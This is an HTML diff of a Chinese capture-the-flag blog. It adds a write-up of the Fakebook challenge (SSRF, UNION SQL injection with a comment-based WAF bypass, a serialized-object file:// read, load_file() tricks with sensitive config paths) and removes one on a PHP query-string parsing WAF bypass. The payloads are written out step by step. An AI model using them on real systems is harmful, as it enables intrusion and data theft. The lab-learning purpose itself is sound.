@@ -169,6 +169,117 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-ssrf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/02/08/ssrf/" class="article-date">
+  	<time datetime="2021-02-08T13:16:37.000Z" itemprop="datePublished">2021-02-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/08/ssrf/">
+        21-buu练习[网鼎杯 2018]Fakebook（ssrf漏洞）
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2>知识点：ssrf</h2>
+
+<p>SSRF,也就是Server Side RequestForgery—服务器端请求伪造。从字面上来看，与CSRF不同的是，它是服务器端发出的请求伪造而非从用户一端提交。别误会，作为受信任用户，服务器当然不可能做出损害用户信息的事。它是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。因为它是由服务端发起的，所以它能够请求到与它相连但与外网隔离的内部系统。<br>一般由curl的滥用引起。</p>
+<h2>题目：</h2>
+<h3>##1信息搜集</h3>
+
+<p>通过dirsearch扫描到robots.txt,访问robots.txt，如下<br><img src="/2021/02/08/ssrf/s1.png"><br>发现存在/user.php.bak,下载下来打开如下图:<br><img src="/2021/02/08/ssrf/s2.png"><br>经过分析可得：</p>
+<ul>
+<li>1，注册界面输入的blog经过了isValidBlog（）函数的过滤，不然直接在注册界面输入file:///var/www/html/flag.php就能拿到flag。
+</li><li>2，get()函数存在ssrf漏洞。
+</li></ul>
+<h3>##2注册一个账号测试</h3>
+
+<p><img src="/2021/02/08/ssrf/s3.png"><br>注意blog是一个http或https的链接的形式，否则将无法通过<br>点击用户名进入用户界面:<br><img src="/2021/02/08/ssrf/s4.png"><br>打开后发现url里面有参数no，尝试注入：</p>
+<ul>
+<li>view.php?no=1 order by 4--+//正常
+</li><li>view.php?no=1 order by 5--+//报错
+</li></ul>
+
+<p><img src="/2021/02/08/ssrf/s5.png"><br>order by 5时报错，可以判断字段数为4。<br>输入union select 1,2,3,4:</p>
+<ul>
+<li>view.php?no=1 union select 1,2,3,4--+
+</li></ul>
+
+<p><img src="/2021/02/08/ssrf/s6.png"><br>提示no hack<br>于是尝试绕过waf，改为union/**/select：</p>
+<ul>
+<li>view.php?no=1 union/**/select 1,2,3,4--+
+</li></ul>
+
+<p><img src="/2021/02/08/ssrf/s9.png"><br>成功绕过，发现注入点为2<br>爆数据库：<ul></ul></p>
+<li>/view.php?no=0 union/**/select 1,database(),3,4--+
+
+
+<p><img src="/2021/02/08/ssrf/s7.png"><br>数据库为：fakebook<br>爆表：<ul></ul></p>
+</li><li>/view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'--+
+
+
+<p><img src="/2021/02/08/ssrf/s8.png"><br>表为：users。<br>得列名：<ul></ul></p>
+</li><li>/view.php?no=0%20union/**/select%201,group_concat(column_name),3,4 from information_schema.columns where table_schema='fakebook' and table_name='users'--+
+
+
+<p><img src="/2021/02/08/ssrf/s10.png"><br>列名为：no,username,passwd,data<br>查出数据：/view.php?no=0%20union/**/select%201,group_concat(no,’-‘,username,’-‘,passwd,’-‘,data),3,4 from fakebook.users –+<br><img src="/2021/02/08/ssrf/s11.png"><br>数据如下：<br>1-admin-c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec-O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:19;s:4:”blog”;s:67:”<a target="_blank" rel="noopener" href="http://2f653644-f372-48c1-a0f9-7938cd6adf27.node3.buuoj.cn/join.php&quot;;%7D">http://2f653644-f372-48c1-a0f9-7938cd6adf27.node3.buuoj.cn/join.php&quot;;}</a></p>
+<h3>##3利用ssrf漏洞</h3>
+<ul>
+<li>/view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
+</li></ul>
+
+<p>查看源码：<br><img src="/2021/02/08/ssrf/s12.png"><br>打开网址，得到flag！</p>
+<h3>##4非预期解</h3>
+
+
+<p>因为没有禁用load_file()函数，所以可以直接利用该函数拿到flag。哈哈，看到这个非预期解还是有点懵的，绕了半天结果简单一步就出来了<br>payload：<br>/view.php?no=0 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4<br><img src="/2021/02/08/ssrf/s13.png"><br>直接得到flag！</p>
+<h4>非预期解的深入探索</h4>
+
+<p>一，受到参数 secure_file_priv 的影响<br>查了查资料，因为涉及到在服务器上写入文件，所以上述函数能否成功执行受到参数 secure_file_priv 的影响二，利用条件<br>而且想要利用是有条件限制的：<br>1、必须有权限读取并且文件必须完全可读。<br>2、欲读取文件必须在服务器上<br>3、必须指定文件完整的路径<br>4、欲读取文件必须小于max_allowed_packet<br>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。<br>在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，<br>users就不能实现用load_file读取文件了。<br>三，利用技巧<br>1，绕过引号，因为现在magic_quotes_gpc=off的主机少之又少，怎么才能构造处没有引号的语句呢？<br>load_file(‘c:/boot.ini’) ==&gt; load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br>2，load_file()还有一些常用的读取敏感信息方法，例如：<br>——————<br>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</p>
+<p>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf  查看WINDOWS系统apache文件</p>
+<p>c:/Resin-3.0.14/conf/resin.conf   查看jsp开发的网站 resin文件配置信息.</p>
+</li>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-zip" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -974,101 +1085,6 @@ highlight_file(__FILE__);
 
 <p><img src="/2021/01/27/txt/txt7.png"><br>得到flag！</p>
 
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-clac" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/01/26/clac/" class="article-date">
-  	<time datetime="2021-01-26T03:05:13.000Z" itemprop="datePublished">2021-01-26</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/26/clac/">
-        12-buu练习Easy clac
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2>知识点</h2>
-<h3>PHP的字符串解析特性</h3>
-<br>这是别人对PHP字符串解析漏洞的理解，PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
-<br><b>/news.php?%20news[id%00=42"+AND+1=0–</b>
-<br>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。
-<br>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
-<ul>
-<li>1.删除空白符
-</li><li>2.将某些字符转换为下划线（包括空格）
-</li></ul>
-例如：
-<br>假如waf不允许num变量传递字母：
-<ul>
-<li>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
-</li></ul>
-可以在num前加个空格：
-<ul>
-<li>http://www.xxx.com/index.php? num = aaaa
-</li></ul>
-这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。
-<h3>waf</h3>
-原来waf我们是看不见的，并且，waf并不是说，题目是用php写的，那么waf就一定是用php写的。也正因如此，这题的waf才会无法识别“ num”和“num”其实是一样的。
-<h3>scandir()</h3>
-这个函数可以列出参数目录中的文件和目录，帮助我们找到flag。
-<h2>题目</h2>
-<br>打开题目链接，查看源代码，获得以下信息：<br>
-<img src="/2021/01/26/clac/clac1.png">
-<br><b>$("#content").val() 是什么意思：</b>
-<br>获取id为content的HTML标签元素的值,是JQuery,     $("#content")相当于document.getElementById("content");       $("#content").val()相当于 document.getElementById("content").value;
-<br>无论怎么注入都是400,403和500，这里用的是一个PHP的字符串解析特性
-<h3>步骤</h3>
-<br>扫描一下根目录：
-<ul>
-<li>clac.php? num=1;var_dump(scandir(chr(47)))
-</li></ul>
-<img src="/2021/01/26/clac/clac2.png">
-<br>得到flag文件，然后读取flag文件：
-<ul>
-<li>calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
-</li></ul>
-<img src="/2021/01/26/clac/clac3.png">
-<br>得到flag！
       
     </div>
     
